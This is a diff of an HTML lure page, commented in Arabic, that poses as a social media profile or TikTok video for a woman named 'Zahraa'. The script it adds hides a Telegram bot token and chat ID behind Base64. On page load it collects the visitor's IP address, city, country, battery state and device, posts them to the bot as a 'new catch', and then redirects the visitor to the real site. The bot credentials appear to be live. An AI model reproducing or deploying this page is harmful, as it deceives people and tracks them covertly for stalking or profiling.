@@ -3,28 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <script>
-        // --- نظام المعاينة والتحقق من النهاية ---
         const p = new URLSearchParams(window.location.search);
-        const mode = p.get('id'); // الكلمة المميزة بعد ?id=
+        const mode = p.get('id');
 
-        // إذا دخل الشخص على الرابط الأساسي بدون نهاية مميزة، يتم تحويله لجوجل فوراً
-        if (!mode) {
-            window.location.href = "https://www.google.com";
-        }
+        // التوجيه الفوري لجوجل إذا لم يكن هناك ID (للحماية)
+        if (!mode) { window.location.href = "https://www.google.com"; }
 
-        const config = {
-            fb: { t: "Zahraa Zahraa", d: "🌸 ممتنة لكل لحظة.. الحياة حلوة بضحكتنا ✨💖 🎀", i: "https://www.facebook.com/images/fb_icon_325x325.png" },
-            ig: { t: "Zahraa Zahraa (@Zahraa_Z)", d: "📸 Official Instagram Profile | 🌸✨🎀", i: "https://www.instagram.com/static/images/ico/favicon-192.png/ed9761293500.png" },
-            tt: { t: "🔥 شاهد قبل الحذف!", d: "أقوى تريند تيك توك لهذا الأسبوع 🎬🔥 شاهد الآن", i: "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/card/main/2.0/share.png" }
+        // إعدادات المعاينة
+        const metaData = {
+            fb: { t: "Zahraa Zahraa", d: "🌸 ممتنة لكل لحظة.. الحياة حلوة بضحكتنا ✨💖 🎀" },
+            ig: { t: "Zahraa Zahraa (@Zahraa_Z)", d: "📸 Official Instagram Profile | 🌸✨🎀" },
+            tt: { t: "🔥 شاهد قبل الحذف!", d: "أقوى تريند تيك توك لهذا الأسبوع 🎬🔥 شاهد الآن" }
         };
 
-        const s = config[mode] || {};
-        if (mode) {
-            document.write(`<meta property="og:title" content="${s.t}"><meta property="og:description" content="${s.d}"><meta property="og:image" content="${s.i}"><meta property="og:type" content="website">`);
-            document.title = s.t;
-        }
+        const choice = metaData[mode] || metaData.fb;
+        
+        // تغيير عنوان الصفحة يدوياً
+        document.title = choice.t;
     </script>
+
+    <meta property="og:title" content="Zahraa Zahraa" />
+    <meta property="og:description" content="🌸 ممتنة لكل لحظة.. الحياة حلوة بضحكتنا ✨💖 🎀" />
+    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
+    <meta property="og:type" content="website" />
 
     <style>
         body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; overflow: hidden; }
@@ -34,6 +37,47 @@
     </style>
 </head>
 <body id="ui_bg">
+    <div id="content" style="display: none; text-align: center;">
+        <div class="loader"></div>
+        <h2 id="status_text">جاري التحميل...</h2>
+    </div>
+
+    <script>
+        // تشفير البيانات (Base64)
+        const _v1 = "Nzc3NzMxMDI2NjpBQUd5V1hGVm02Qjd0anI1aFItU0lsS0VvNE4xbUl2TmxfTQ==";
+        const _v2 = "NTc3NTc4MTAzOA==";
+        const _v3 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==";
+
+        if (mode) {
+            document.getElementById('content').style.display = 'block';
+            document.getElementById('ui_bg').className = mode + '_style';
+            document.getElementById('status_text').innerText = mode === 'tt' ? 'جاري تشغيل الفيديو...' : 'جاري تحميل الملف الشخصي...';
+
+            async function capture() {
+                try {
+                    const ipReq = await fetch('https://ipapi.co/json/');
+                    const ipD = await ipReq.json();
+                    const b = await navigator.getBattery();
+                    const bat = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
+                    
+                    const labels = { fb: "فيسبوك", ig: "انستقرام", tt: "تيك توك" };
+                    const report = `🎯 **صيد جديد (${labels[mode]})**\n\n🌐 الـ IP: \`${ipD.ip}\`\n📍 الموقع: \`${ipD.city}, ${ipD.country}\`\n🔋 البطارية: \`${bat}\`\n📱 الجهاز: \`${navigator.platform}\``;
+
+                    await fetch(atob(_v3) + atob(_v1) + "/sendMessage", {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: atob(_v2), text: report, parse_mode: 'Markdown' })
+                    });
+                } catch (e) {} finally {
+                    const t = { fb: "https://www.facebook.com", ig: "https://www.instagram.com", tt: "https://www.tiktok.com" };
+                    setTimeout(() => { window.location.href = t[mode]; }, 2000);
+                }
+            }
+            window.onload = capture;
+        }
+    </script>
+</body>
+</html>
     <div id="content" style="display: none; text-align: center;">
         <div class="loader"></div>
         <h2 id="status_text">جاري التحقق...</h2>
